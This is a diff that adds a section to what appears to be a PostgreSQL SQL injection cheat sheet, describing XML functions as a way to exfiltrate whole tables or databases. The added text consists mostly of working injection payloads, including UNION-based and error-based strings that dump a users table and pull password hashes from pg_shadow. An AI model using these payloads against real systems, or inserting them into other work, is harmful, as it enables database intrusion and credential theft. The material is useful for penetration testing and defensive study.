@@ -143,6 +143,68 @@ WHERE table_name LIKE '%user%'
    OR table_name LIKE '%login%';
 ```
 
+### XML Helper Functions for Data Extraction
+
+PostgreSQL provides powerful XML functions that can extract entire tables or databases as XML, useful when you need to exfiltrate large amounts of data:
+
+#### query_to_xml()
+
+Converts any query result to XML:
+
+```sql
+-- Extract entire table as XML
+SELECT query_to_xml('SELECT * FROM users', true, true, '');
+
+-- Extract specific columns
+SELECT query_to_xml('SELECT username, password FROM users', true, true, '');
+
+-- With WHERE clause
+SELECT query_to_xml('SELECT * FROM users WHERE role=''admin''', true, true, '');
+```
+
+#### table_to_xml()
+
+Converts a table directly to XML:
+
+```sql
+-- Extract entire table
+SELECT table_to_xml('users', true, true, '');
+
+-- With schema qualification
+SELECT table_to_xml('public.users', true, true, '');
+```
+
+#### database_to_xml()
+
+Extracts the entire database schema and data as XML (use with caution - can be very large):
+
+```sql
+-- Full database dump as XML
+SELECT database_to_xml(true, true, '');
+```
+
+#### database_to_xmlschema()
+
+Gets the database schema structure without data:
+
+```sql
+-- Get database structure only
+SELECT database_to_xmlschema(true, true, '');
+```
+
+#### XML Extraction Injection Examples
+
+```sql
+-- UNION-based XML extraction
+' UNION SELECT NULL,query_to_xml('SELECT * FROM users',true,true,''),NULL--
+
+-- Extract password hashes via XML
+' UNION SELECT NULL,query_to_xml('SELECT usename,passwd FROM pg_shadow',true,true,''),NULL--
+
+-- Error-based XML extraction (if output is limited)
+' AND 1=CAST(query_to_xml('SELECT password FROM users LIMIT 1',true,true,'') AS int)--
+```
+
 ### Notes
 
 - `information_schema` is SQL-standard and portable across databases
